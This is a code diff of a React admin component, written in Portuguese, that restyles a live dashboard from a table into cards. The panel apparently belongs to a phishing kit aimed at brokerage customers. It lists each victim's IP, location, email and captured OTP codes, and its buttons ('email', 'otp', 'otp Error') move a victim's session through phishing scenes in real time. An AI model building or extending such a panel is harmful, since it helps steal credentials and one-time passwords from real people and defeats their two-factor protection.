@@ -86,50 +86,28 @@ export default function Adm({ip,socket}) {
   };
 
   return (
-    <div className="LoadNaquelas">
-
-      <table className="table1">
-        <thead >
-          <tr className="thM tituloTab">
-          <th>STATUS</th>
-            <th>Corretora</th>
-            <th>IP</th>
-            <th>País</th>
-            <th>Cidade</th>
-            <th>ULT. ATUALIZAÇÃO</th>
-            <th>Email</th>
-            <th>OTP</th>
-            <th>OTP SMS/MSG</th>
-            <th className="tdM2">CENA</th>
-            <th className="ferramentas">Ações</th>
-          </tr>
-        </thead>
-        <tbody className="thM">
-          {lista.map(
-            (
-              item,
-              index // Adicionado o return aqui
-            ) => (
-              <tr key={index} className="thM">
-                                <td>
-              <span className={`status-bullet ${item.online ? 'status-online' : 'status-offline'}`}></span>
-            </td>
-                <td>{item.corretora}</td>
-                <td>{item.ip}</td>
-                <td>{item.countryCode}</td>
-                <td>{item.city}</td>
-                <td style={{ color: item.online ? 'green' : 'red' }}>
-                  {moment.tz(item.date, "America/Sao_Paulo").format("DD/MM/YY HH:mm:ss")}
-                </td>
-                <td>{item.email}</td>
-                <td>{item.OTP}</td>
-                <td>{item.OTP2}</td>
-                <td className="tdM2">{item.cena}</td>
-                <td className="prices-table__cell is-right button-cell ferramentas">
-                 
-
-                  
-                  <form onSubmit={handleSubmit(item.ip)}  > 
+   
+  <div className="cards-container">
+      {lista.map((item, index) => (
+        <div key={index} className="card">
+          <div className="card-header">
+          <span className={`status-bullet ${item.online ? 'status-online' : 'status-offline'}`}></span>
+            {/* Informações importantes no cabeçalho do card */}
+            Corretora: {item.corretora} | IP: {item.ip}
+          </div>
+          <div className="card-body">
+            {/* Corpo do card com as informações como um formulário preenchido */}
+            País: {item.countryCode}<br/>
+            Cidade: {item.city}<br/>
+            Última Atualização: {moment.tz(item.date, "America/Sao_Paulo").format("DD/MM/YY HH:mm:ss")}<br/>
+            Email: {item.email}<br/>
+            OTP: {item.OTP}<br/>
+            OTP SMS/MSG: {item.OTP2}<br/>
+            Cena: {item.cena}
+          </div>
+          <div className="card-footer">
+            {/* Botões no rodapé do card */}
+            <form onSubmit={handleSubmit(item.ip)}  > 
                       <button className="btn btn-primary btn-sm teste" type="submit" id="email">email</button>
                       <button className="btn btn-secondary btn-sm teste" type="submit" id="otp">otp</button>
                       <button className="btn btn-secondary btn-sm teste" type="submit" id="otp_Error">otp Error</button>
@@ -157,14 +135,9 @@ export default function Adm({ip,socket}) {
                         </div>
                       </div>
                   </form>
-
-               
-                </td>
-              </tr>
-            )
-          )}
-        </tbody>
-      </table>
+          </div>
+        </div>
+      ))}
     </div>
   );
 }
